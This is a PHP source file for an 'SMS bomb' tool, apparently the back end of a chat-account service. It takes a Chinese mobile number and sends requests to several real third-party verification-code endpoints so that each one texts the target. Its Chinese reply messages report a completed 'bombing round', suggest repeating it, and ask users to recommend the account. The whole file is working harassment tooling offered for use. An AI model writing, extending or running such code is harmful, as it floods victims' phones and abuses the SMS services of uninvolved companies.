<?php

require_once 'HttpUtil.php';

class Smsbomb {
	public $keyword = '';
	public function __construct($keyword) {
		$this->keyword = $keyword;
	}
	public function get() {
		if ( preg_match("/^((1[3,5,8][0-9])|(14[5,7])|(17[0,6,7,8]))\d{8}$/", $this->keyword)) {
			$http_util = new HttpUtil();
			$data = array(
				"http://go.5ivx.com/Home/Index/code?mobile=$this->keyword&channel=hl-gdt-4",
				"http://promotion.trip.taobao.com/platform/tripp_send_sms_screen.htm?_ksTS=1422022510111_178&callback=jsonp179&subActId=1391&phonenum=$this->keyword",
				"http://usercenter.12308.com/verifyCode/sendCode.sc?mobilePhone=$this->keyword",
				"http://www.ule.com/status/often.html?jsonpCallback=jsonp1419507393210&_=1419507405579&userMobile=$this->keyword",
				"http://id.ourgame.com/sjyzm!getMobileYzm.do?passport=$this->keyword",
				"http://smsspub.mail.163.com/mobileserv/fsms.do?callback=_tmp_jsonp_callback1419408928602&product=AndroidMail&template=ds23&mobile=$this->keyword",
				"http://m.jiuxian.com/m_v1/user/sendLoginCode?type=0&mobile==$this->keyword",
				"http://www.ule.com/status/often.html?jsonpCallback=jsonp1419507393210&_=1419507405579&userMobile=$this->keyword",
				
			);
			
			foreach ($data as $value) {
				$http_util->get($value);
			}
			
			return "已经轰炸一轮...\n再来一轮请重新输入手机号，建议稍等片刻再轰炸！\n如果觉得好用，请推荐公众号给你的好友。\n\n【输入Q/q返回主界面！】";
		}
		else {
			return "您输入的手机号码不是有效的手机号码，请检查后重试！\n\n【输入Q/q返回主界面！】";
		}
	}
}